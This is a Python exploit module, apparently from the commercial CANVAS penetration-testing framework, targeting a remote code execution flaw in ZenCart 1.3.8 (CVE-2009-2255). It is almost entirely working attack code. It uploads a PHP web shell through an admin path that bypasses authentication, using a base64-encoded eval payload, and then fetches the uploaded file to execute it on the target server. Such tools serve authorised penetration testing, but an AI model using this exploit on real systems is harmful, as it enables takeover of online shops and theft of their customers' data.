#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *


NAME="zencart_remote"
DESCRIPTION="ZenCart 1.3.8 Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="www.zen-cart.com/"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2009-2255"
DOCUMENTATION["CVE URL"] = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-2255"
DOCUMENTATION['CVSS'] = 6.8

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]


CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        
        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.version            = 0
        self.done               = 0
        self.name               = NAME    
        self.basepath           = "/"
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = ""
        self.shellfile          = ""
	self.testfile           = ""
	self.targetpath         = self.basepath+"/admin/record_company.php/password_forgotten.php?action=insert"
	self.verb               = "POST"
        self.content_type       = "multipart/form-data; boundary=---------------------------p"
	self.foundstrings       = ["Zen Cart","zencart"]
	self.basepaths          = ["/zencart/","/"]       
	self.ssl                = 0
	self.shellfile          = self.get_random_file(maxlength=6, filetype=".php")

        return

   
    def request1(self):
        payload="""-----------------------------p
Content-Disposition: form-data; name="record_company_name";

0
-----------------------------p
Content-Disposition: form-data; name="record_company_image"; filename="%s";
Content-Type: tgreal/suce


<?php eval(base64_decode("%s")); ?>
-----------------------------p--
"""%(self.shellfile, b64encode(self.get_php_to_mosdef()).strip())
	
	self.UA.addHeader("Content-Type", self.content_type)
	data = self.UA.POST(self.targetpath, payload, noresponse=False)
	
	return True

    def request2(self):
	
	data = self.UA.GET("/images/%s"%self.shellfile)
	
	return True
	
			
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
